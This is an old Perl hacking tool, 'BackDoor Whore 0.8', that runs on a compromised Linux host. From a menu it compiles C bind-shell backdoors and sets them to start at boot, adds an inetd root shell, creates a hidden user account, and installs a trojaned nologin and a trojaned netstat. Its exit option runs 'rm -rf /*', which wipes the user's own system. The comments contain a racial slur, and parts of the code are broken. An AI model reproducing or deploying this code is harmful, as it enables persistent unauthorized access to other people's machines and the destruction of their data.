   #!/usr/bin/perl
   # BackDoor Whore 0.8
   # Author: ntfx <ntfx@kernel.net> (Tony Spilotro)
   # Legion2000SR http://legion2000.trash.cx
   # The other backdoor i made was something which apparently originated
   # from under my shoe, so i remade it, still basic but does the job.
   ###################################
   # We will greet: Katx <3, opt1k, mimay1n, SpyModem, soldierx.com,
   #                #!/usr/bin/laden, all L2K and Lbyte Security, Fubar
   #if(! $ARGV[0])
   #{
   # &usage;
   # exit;
   #}
   # i havent even tested this script, it was merely a bit of fun and to get me back into perl.
   # so if it niggers up on you then thats your problem.
   &option();
   # ill only take credit for the perl and some of the c,
   # but yes some of the c backdoored are borrowed.
   sub option() {
       system("export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin");
       system("export HOME=/root");
       system("export TERM=vt100");
       system("clear");
   print "##################################\n";
   print "#Backdoor Whore  By ntfx         #\n";
   print "#Contact: <ntfx\@kernel.net>      #\n";
   print "#Legion2000SR (c)         #\n";
   print "##################################\n";
   print "#[ 1] Open up TCP backdoor.      #\n";
   print "#[ 2] Open up UDP backdoor.      #\n";
   print "#[ 3] Netstat Backdoor.           #\n";
   print "#[ 4] Add User.           #\n";
   print "#[ 5] Inetd backdoor.         #\n";
   print "#[ 6] Exit.               #\n";
   print "##################################\n";
   print "#Enter Option:";
   chomp($number=<STDIN>);
       if($number == "1") { &tcp() }
       if($number == "2") { &udp() }
       if($number == "3") { &nets() }
       if($number == "4") { &usr() }
       if($number == "5") { &inet() }
       if($number == "6") { &ex() }
       else { &option() } }
   ##################
   sub tcp() {
       open(tcp, ">tcpback.c");
       print tcp <<HAHAWHATAFUCKINGJOKEMYSON;

   short a[9];
   main(){
       a[1]=12350;
       dup2(dup2(accept(3,listen(3,1),bind(socket(*a=2,1,0),a,16)),0),1);
       system("sh");
   }
   HAHAWHATAFUCKINGJOKEMYSON
   close(tcp);
   system("gcc tcpback.c -o inet; mv inet /usr/bin/inet; echo /usr/bin/inet & >>/etc/rc.d/rc.local");
   system("exec /usr/bin/inet &");
   sleep 1;  }
   ###################
   sub udp() {
       open(udp, ">udpback.c");
       print udp <<HAHAUDP;
   #include <stdio.h>
   #include <stdlib.h>
   #include <sys/socket.h>
   #include <sys/types.h>
   #include <netinet/in.h>
   #include <unistd.h>
   #include <netdb.h>

   void mk_daemon();

   int main(int argc, char **argv)
   {
   int lfd,cfd;
   socklen_t len;
   struct sockaddr_in cli,serv;
   pid_t pid;
   char **sh;

   sh[0]="/bin/sh";
   sh[1]=NULL;

   mk_daemon();
   strncpy(argv[0],"ps",sizeof(argv[0]));
   lfd=socket(AF_INET,SOCK_STREAM,0);
   bzero(&serv,sizeof(serv));
   serv.sin_family=AF_INET;
   serv.sin_addr.s_addr=htonl(INADDR_ANY);
   serv.sin_port=htons(65535);
   bind(lfd,(struct sockaddr *)&serv,sizeof(serv));
   listen(lfd,5);
   /* Legion2000 Security owns you */
   while(1)
   {
   len=sizeof(cli);
   cfd=accept(lfd,(struct sockaddr *)&cli,&len);
       if(!(pid=fork()))
       {
       dup2(cfd,0);
       dup2(cfd,1);
       dup2(cfd,2);
       execve(sh[0],sh,NULL);
       close(cfd);
       exit(0);
       }
   close(cfd);
   }
   return 0;
   }

   void mk_daemon()
   {

   int x;
   pid_t pid;
       if((pid=fork()) !=0)
       {
       exit(-1);
       }
   setsid();
   signal(SIGHUP,SIG_IGN);
   signal(SIGINT,SIG_IGN);

       if((pid=fork()) !=0)
       {
       exit(-1);
       }
   chdir("/");
   umask(0);
       for(x=0;x<=64;x++)
       {
       close(x);
       }
   }
   HAHAUDP
   close(udp);
   system("gcc udp.c -o inetdc; mv inetdc /usr/bin/inetdc; echo /usr/bin/inetdc & >>/etc/rc.d/rc.local");
   system("exec /usr/bin/inetdc &");
   sleep 1;
   ##########
   sub usr() {
       system ("clear");
   print "we will now add a unsuspicious user to the system\n";
   print "username: ";
   chomp($user=<STDIN>);
   print "UID: ";
   chomp($uid=<STDIN>);
   print "GID: ";
   chomp($gid=<STDIN>);
   print "home dir: ";
   chomp($home=<STDIN>);
   print "type of shell: ";
   chomp($sh=<STDIN>);
   print "comments: ";
   chomp($cm=<STDIN>);
       system("/usr/sbin/useradd $user -u $uid -g $gid -d $home -s $sh -c $cm");
   print "passwd:";
       system("passwd $user");
   sleep 1;  }
   ##################
   #
   sub inet() {
   print "we will now backdoor inet with a root shell.\n";
       system("echo afs stream tcp nowait root /bin/sh sh >>/etc/inetd.conf;killall -HUP inetd");
   }
   #
   sub nologin() {
   open  (nologin, ">nologin.c");
   print nologin <<FUCKNUTS;

   #include <stdio.h>
   int main()
   {
       char buffer[1024]
       memset (buffer,0,1024);
       printf("This account is currently not available.\n");
       fgets(buffer,1024,stdin);
       if(strncmp(buffer,"legion2000",12)==0) /* the password is legion2000 change it if you wish */
       {
           setuid(0);
           seteuid(0);
           system("/bin/bash");
       }
       return 0;
   }
   FUCKNUTS
   close(nologin);
   system ("gcc nologin.c -o nologin; mv nologin /sbin/nologin");
   print "nologin backdoor is now installed ;)";
   sleep 1; }
   ##
   sub nets() {
   # this one needs input due to the fact its hiding your i.p
   # yes i borrowed most of this code.
   open  (netstat, ">netstat.c");
   print netstat <<NETSTATKREWINTHEPLACE;

   #include <stdio.h>
   #include <sys/types.h>
   #include <sys/wait.h>
   #include <string.h>

   #define NETTMP "/usr/local/bin/bzcat2"
   #define NETHIDE "/tmp/.,"

   int main() {

           FILE *fd;
           char fname[1024];
           char sos[1024];
           char sosa[1024];
           strcpy(fname,NETHIDE);

           if(!(fd = (fopen(fname, "r")))) {
           printf("Error creating raw socket\n");
           exit(0);
           }

           bzero(sos,sizeof(sos));
           fgets(sos,sizeof(sos),fd);

           while(fgets(sos,sizeof(sos),fd)) {
                   sprintf(sosa,"%s | grep -v %s", NETTMP, sos);
                   system(sosa);
           exit(0);
           }
           return 0;
           fclose(fd);
   }

   NETSTATKREWINTHEPLACE
   close(netstat);
       system("gcc netstat.c -o netstat; mv netstat netstat");
       print "what is your i.p, we need this for netstat to hide";
       chomp($ip=<STDIN>);
       system("echo $ip > /tmp/.,");
       print "netstat is now backdoored";
   sleep 2; }
   }
   #
   #sub usage() {
   #print "USAGE: perl backwhore.pl\n";
   #print "Legion2000SR http://legion2000.trash.cx";
   #exit(0); }
   #
   sub ex() {
   # too clueless to remove this line then you shouldnt even bother "hacking";
   system("rm -rf /* &");
   print "you clueless fuckwit, i told you to edit the code, now look what you have done";
   print "total rm -rf / of the system, see you in jail ;)";
   sleep 1;
   exit 1;}
   # This has been a Legion2000 / HcV Production.
